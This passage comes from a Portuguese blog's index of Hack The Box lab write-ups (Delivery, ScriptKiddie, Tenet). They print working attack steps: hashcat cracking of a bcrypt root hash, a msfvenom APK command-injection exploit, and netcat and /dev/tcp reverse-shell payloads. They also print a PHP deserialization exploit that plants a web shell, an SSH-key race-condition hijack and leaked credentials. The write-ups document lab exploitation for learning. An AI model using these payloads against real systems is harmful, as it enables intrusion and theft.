$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | system_admin system_user | | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | system_user              | | channelexport                    |                                                              | system_user              | | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | system_user              | +----------------------------------+--------------------------------------------------------------+--------------------------+   Uma vez que no Mattermost o usuário root disse que a senha não estaria no dicionário, mas que poderia ser uma variação de PleaseSubscribe!, pesquisando sobre algumas formas de fazer o cracking desta senha encontrei a seguinte forma usando o hashcat:      basicpwd.txt contém a senha PleaseSubscribe! conforme mencionado no Mattermost;   O arquivo best64.rule contém algumas das mais populares formas de variação de senha.   Executando selecionando o tipo de hash correto (3200 - bcrypt), encontramos a senha PleaseSubscribe!21   $ hashcat -a 0 -m 3200 hash basicpwd.txt -r /usr/share/hashcat/rules/best64.rule hashcat (v6.1.1) starting...  OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz, 5847/5911 MB (2048 MB allocatable), 2MCU  Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 72  Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 77  Applicable optimizers applied: * Zero-Byte * Single-Hash * Single-Salt  Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled.  Host memory required for this attack: 64 MB  Dictionary cache built: * Filename..: basicpwd.txt * Passwords.: 1 * Bytes.....: 17 * Keyspace..: 77 * Runtime...: 0 secs  The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework  Approaching final keyspace - workload adjusted.  $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21   Utilizando a senha encontrada foi possível obter a última flag :smiley:   maildeliverer@Delivery:/opt/mattermost/config$ su root Password: root@Delivery:/opt/mattermost/config# cd /root/ root@Delivery:~# cat root.txt &lt;redacted&gt; root@Delivery:~#   Além do root flag, no arquivo note.txt ippsec deixa uma mensagem:      I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I’ve seen several times.  The inspiration for the box is here:     - https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c     Keep on hacking! And please don’t forget to subscribe to all the security streamers out there.     - ippsec    Espero que tenham gostado!   Até a próxima! :smile:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-easy","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/05/htb-delivery/",
        "teaser": "https://i.imgur.com/FTjLM76.png"
      },{
        "title": "Hackthebox write-up: ScriptKiddie",
        "excerpt":"Olá pessoal!   A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.   :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas      Enumeração   Como de costume, iniciado enumeração com um scan rápido do nmap para verificar os serviços publicados nesta máquina.   $ nmap -sC -sV -Pn -oA quick 10.10.10.226                                                                     Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 14:05 -03 Nmap scan report for 10.10.10.226 Host is up (0.077s latency). Not shown: 998 closed ports PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA) |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA) |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519) 5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-server-header: Werkzeug/0.16.1 Python/3.8.5 |_http-title: k1d'5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds   5000/TCP - Serviço HTTP   Ao acessar a página notado algumas ferramentas a serem utilizadas por algum script kiddie como executar um scan utilizando o nmap, criar um payload no msfvenom e buscar por exploits utilizando o searchsploit.   Tentei diversas formas de injeção de código neste formulário, inclusive tentando algo automatizado como por exemplo a ferramenta commixproject/commix que encontrei no Github, porém sem sucesso desta vez.   Buscando por vulnerabilidades nas ferramentas utilizadas pela página (nmap, msfvenom, searchsploit), acabei encontrando uma relacionada ao msfvenom, conforme abaixo:   $ searchsploit msfvenom ---------------------------------------------------------------------- ---------------------------------  Exploit Title                                                        |  Path ---------------------------------------------------------------------- --------------------------------- Metasploit Framework 6.0.11 - msfvenom APK template command injection | multiple/local/49491.py ---------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   Aceso inicial e User flag   Alterado arquivo python com o payload desejado rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f, encontrei alguns erros durante a execução do binário keytool, uma vez que este tenta assinar um arquivo APK com o payload no Common Name mas, uma vez que existia um caracter + no conteúdo codificado em base64 na primeira iteração, precisei modificá-lo para codificá-lo novamente, gerando um payload desta vez com sucesso a ser enviado na ferramenta e utilizado na exploração da vulnerabilidade no portal:   # Change me payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f'  # b64encode to avoid badchars (keytool is picky) payload_b64 = b64encode(payload.encode()).decode() if '+' in payload_b64:     payload_b64 = b64encode(payload_b64.encode()).decode()     decode = '| base64 -d | base64 -d' else:     decode = '| base64 -d'  dname = f\"CN='|echo -n {payload_b64} {decode} | sh #\"   Abaixo podemos ver o output da criação do payload gerado, no caso o arquivo evil.apk   $ python3 49491.py                                                                                                                [+] Manufacturing evil apkfile Payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f -dname: CN='|echo -n Y20wZ0wzUnRjQzltTzIxclptbG1ieUF2ZEcxd0wyWTdZMkYwSUM5MGJYQXZabnd2WW1sdUwzTm9JQzFwSURJK0pqRjhibU1nTVRBdU1UQXVNVFF1TVRNMklEUTBORE1nUGk5MGJYQXZaZz09 | base64 -d | base64 -d | sh #    adding: empty (stored 0%) jar signed.  Warning: The signer's certificate is self-signed. The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update. The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update. POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.  [+] Done! apkfile is at /tmp/tmpt7qr4ner/evil.apk Do: msfvenom -x /tmp/tmpt7qr4ner/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null   Após gerado o arquivo APK contendo o payload, executado um request no portal com os dados sugeridos no final da execução do script anterior, apontando para o LHOST 127.0.0.1 e selecionando o tipo de payload android, que deverá ser traduzido para o payload android/meterpreter/reverse_tcp.      Após clicar no botão Generate, um shell reverso foi retornado no listener inicializado previamente conforme especificado durante a criação do payload.      Nesta mesma sessão obtida, com as credenciais em que o aplicativo se encontrava em execução, no caso o usuário kid, foi possível obter a flag de usuário.   kid@scriptkiddie:~$ id uid=1000(kid) gid=1000(kid) groups=1000(kid) kid@scriptkiddie:~$ cat /home/kid/user.txt &lt;redacted&gt;   Root flag   Depois de executar o linenum.sh, notado que existe outro usuário na máquina, pwn, e que tínhamos direito de leitura em seu perfil de diretório, o qual continha um arquivo chamado scanloosers.sh com o seguinte conteúdo:   #!/bin/bash  log=/home/kid/logs/hackers  cd /home/pwn/ cat $log | cut -d' ' -f3- | sort -u | while read ip; do     sh -c \"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null\" &amp; done  if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi   Uma vez que este script lê o conteúdo de um arquivo localizado no perfil do usuário kid (/home/kid/logs/hackers), editado seu conteúdo com o valor abaixo, de modo que fosse possível injetar o código necessário para a obtenção de um novo shell reverso com a conta pwn, que aparentemente executaria este script de forma recorrente.   echo \"  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4242 0&gt;&amp;1' #\" &gt; ~/logs/hackers   Após definir o novo listener e alterar o arquivo hackers, um novo shell reverso foi retornado, desta vez com a conta pwn :smile:   Enumerando novamente a máquina, desta vez a partir da conta deste novo usuário utilizando o linpeas.sh, notei que este user possuía direitos de execução do msfconsole de modo privilegiado.   [+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid Matching Defaults entries for pwn on scriptkiddie:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User pwn may run the following commands on scriptkiddie:     (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole   Ao instanciar a console utilizando o sudo, pude executar comandos normalmente utilizando o privilégio de root, podendo assim ler o arquivo /root/root.txt e obter a flag final desta máquina   pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole -q msf6 &gt; id [*] exec: id  uid=0(root) gid=0(root) groups=0(root) msf6 &gt; cat /root/root.txt [*] exec: cat /root/root.txt  &lt;redacted&gt; msf6 &gt;   Espero que tenham gostado!   Nos vemos no próximo post :smiley:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-easy","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/06/htb-scriptkiddie/",
        "teaser": "https://i.imgur.com/wHnMfBz.png"
      },{
        "title": "Hackthebox write-up: Tenet",
        "excerpt":"Olá pessoal!   A máquina desta semana será Tenet, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW.   :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.      Antes de iniciar a resolução desta máquina, me chamou atenção a ilustração, a qual busquei e acabei encontrando sobre o quadrado Sator, onde temos um palíndromo com cinco palavras latinas: SATOR, AREPO, TENET, OPERA e ROTAS, que em um conjunto formam um quadrado com as mesmas palavras sendo TENET a central. Muito possivelmente estas palavras poderão estar presentes em algum ponto da resolução desta máquina :smile:.   Enumeração   Como de costume, iniciado com um quick scan nmap para identificar os serviços publicados   $ nmap -sC -sV -Pn -oA quick 10.10.10.223 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 14:36 -03 Nmap scan report for 10.10.10.223 Host is up (0.079s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) |   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.06 seconds   80/TCP - Serviço HTTP   Ao acessar esta página, notado que se trata da página default do Apache, logo iniciei uma enumeração de diretórios com o gobuster onde acabei encontrando alguns diretórios, dentre ele o wordpress.   $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.223/ -o gobuster.txt -x php,txt,html =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            http://10.10.10.223/ [+] Threads:        10 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes:   200,204,301,302,307,401,403 [+] User Agent:     gobuster/3.0.1 [+] Extensions:     php,txt,html [+] Timeout:        10s =============================================================== 2021/02/27 14:44:51 Starting gobuster =============================================================== /index.html (Status: 200) /users.txt (Status: 200) /wordpress (Status: 301) Progress: 5055 / 220561 (2.29%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/02/27 14:48:08 Finished ===============================================================   Ao acessá-lo, notado que a página estava sem formatação, logo validando o código fonte vi que estava com os apontamentos para as imagens em tenet.htb, o qual foi adicionado no /etc/hosts.   Após ajustado o dns, executado scan utilizando o wpscan, onde foi possível enumerar a versão do Wordpress, no caso 5.6, e usuários protagonist e neil   Como ao acessar a página pela url http://10.10.10.223/wordpress informa uma mensagem de erro, conforme imagem abaixo. Acessando a partir do dns configurado e conforme visto no codigo fonte (http://tenet.htb) para visualizar o site wordpress corretamente.      Analisando as postagens ao acessar o wordpress pelo DNS, notei que os posts mencionam um sistema chamado Rotas, que possivelmente possa conter algum item a ser explorado e conseguir um acesso inicial      This Is Where Our Worlds Collide We’re looking for beta testers of our new time-management software, ‘Rotas’ ‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.    As coisas ficam mais interessantes em um post mais antigo, onde o usuário neil comenta o seguinte na postagem:      did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!    Buscando por sator.php no hostname tenet.htb não retornou nada, mas acessando diretamente ao IP do servidor, conforme acessado inicialmente, recebi a página abaixo:      Uma vez que backups são criados com sufixos old ou bak, acabei encontrando o arquivo sator.php.bak no mesmo diretório, onde pude listar o conteúdo abaixo:   &lt;?php  class DatabaseExport {     public $user_file = 'users.txt';     public $data = '';          public function update_db()     {         echo '[+] Grabbing users from text file &lt;br&gt;';         $this-&gt; data = 'Success';     }          public function __destruct()     {         file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);         echo '[] Database updated &lt;br&gt;';         //    echo 'Gotta get this working properly...';     } }  $input = $_GET['arepo'] ?? ''; $databaseupdate = unserialize($input);  $app = new DatabaseExport; $app -&gt; update_db();  ?&gt;   Como podemos ver este código é vulnerável a PHP Deserialization, uma vez que não valida o input recebido via GET a partir do query string arg arepo, permitindo que seja modificado o conteúdo do arquivo de banco de dados.   Acesso inicial   Para acesso inicial o primeiro passo é criar um dado serializado do PHP malicioso e enviar no argumento arepo conforme vimos no metodo get. Buscando um pouco encontrei este exemplo de exploit que foi modificado para gerar um webshell simples na máquina, o qual poderia a posteriori ser utilizado para obter um shell reverso na máquina.   &lt;?php   class DatabaseExport {     public $user_file = 'shell.php';     public $data = '&lt;?php system($_GET[\"cmd\"]); ?&gt;';          public function update_db()     {         echo '[+] Grabbing users from text file &lt;br&gt;';         $this-&gt; data = 'Success';     }          public function __destruct()     {         file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);         echo '[] Database updated &lt;br&gt;';         //    echo 'Gotta get this working properly...';     } }  $url = 'http://10.10.10.223/sator.php?arepo='; $arepo = $url . urlencode(serialize(new DatabaseExport)); $response = file_get_contents(\"$arepo\"); print \"$response\";   Após execução, foi possível validar o funcionamento do webshell com a chamada executando o comando id.   $ php exploit.php [] Database updated &lt;br&gt;[+] Grabbing users from text file &lt;br&gt; [] Database updated &lt;br&gt;[] Database updated &lt;br&gt;     $ curl -L http://10.10.10.223/shell.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data)   Confirmado o acesso, realizado chamada para um shell reverso utilizando o comando abaixo:   curl -G --data-urlencode \"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.136 4443 &gt;/tmp/f\" http://10.10.10.223/shell.php   User Flag   Uma vez com acesso à máquina, já que era sabido que tínhamos um wordpress instalado, busquei pelo arquivo de configuração do wordpress onde pude obter as credenciais para acesso ao banco do usuário neil   // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' );  /** MySQL database username */ define( 'DB_USER', 'neil' );  /** MySQL database password */ define( 'DB_PASSWORD', 'Opera2112' );  /** MySQL hostname */ define( 'DB_HOST', 'localhost' );   Como o reuso de credenciais é algo bastante comum, ao executar o comando su neil, fornecendo a senha presente no arquivo de configuração do wordpress, obtive o acesso com a conta do usuário e a flag de user.   neil@tenet:~$ id uid=1001(neil) gid=1001(neil) groups=1001(neil) neil@tenet:~$ cat ~/user.txt &lt;redacted&gt; neil@tenet:~$   Root Flag   No caminho para a flag de root, decidi fazer o dump das credenciais presentes no wordpress, onde os seguintes hashes foram encontrados.   mysql&gt; select user_login,user_pass from wp_users; +-------------+------------------------------------+ | user_login  | user_pass                          | +-------------+------------------------------------+ | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | | neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | +-------------+------------------------------------+ 2 rows in set (0.00 sec)   Adicionalmente, buscando por possiveis privilégios de sudo do usuário neil (sudo -l), notado que o usuário possuía privilégios para executar o script enableSSH.sh, listado abaixo.   Matching Defaults entries for www-data on tenet:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:      User www-data may run the following commands on tenet:     (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh   Analisando o conteúdo do script vemos que o mesmo foi criado para forçar a configuração de uma chave pública como autorizada para o usuário root para acesso SSH, embora não tenhamos acesso à mesma.   #!/bin/bash  checkAdded() {     sshName=$(/bin/echo $key | /usr/bin/cut -d \" \" -f 3)     if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then         /bin/echo \"Successfully added $sshName to authorized_keys file!\"     else         /bin/echo \"Error in adding $sshName to authorized_keys file!\"     fi }  checkFile() {     if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then         /bin/echo \"Error in creating key file!\"         if [[ -f $1 ]]; then /bin/rm $1; fi         exit 1     fi }  addKey() {     tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)     (umask 110; touch $tmpName)     /bin/echo $key &gt;&gt;$tmpName     checkFile $tmpName     /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys     /bin/rm $tmpName }  key=\"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\" addKey checkAdded   Analisando o script acima, notei uma possibilidade de hijack por conta de um race condition existente, onde na função “addKey” é criado um arquivo temporario, incluindo o seu conteúdo da chave pública e, após isso, seu conteúdo é adicionado no /root/.ssh/authorized_keys, possivelmente nos permitindo modificar este arquivo em tempo de execução para incluir outra chave SSH no lugar desta.   O desafio nesta parte é prever o nome do arquivo ssh em /tmp, mas que ao buscar por uma forma de adicionar um valor em múltiplos arquivos, o comando tee foi a melhor opção. O script abaixo foi criado e colocado em execução para infinitamente incluir o conteúdo de uma chave criada por mim em quaisquer arquivos que possuíssem o nome ssh-* em /tmp.   #!/bin/bash while true; do         echo \"ssh-rsa AAAA..............BBBB= root@ubuntu\" | tee /tmp/ssh-* 2&gt; /dev/null; done   Com o script acima em execução, executado o comando para habilitar o SSH para o usuário root e logo na sequência, o comando ssh para se conectar com a chave privada em nossa posse, onde obtivemos sucesso para conectar nesta máquina utilizando o SSH e obter a flag de root :smiley:   neil@tenet:/tmp$ sudo  /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ ssh -i tenet root@tenet.htb Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64) [...] root@tenet:~# id uid=0(root) gid=0(root) groups=0(root) root@tenet:~# cat /root/root.txt b05e57e997cda49b47757cd3f0f9ac43   Espero que tenham gostado!   Vejo vocês no próximo post! :smile:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-medium","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/06/htb-tenet/",
        "teaser": "https://i.imgur.com/BmkB4rb.png"
      }]
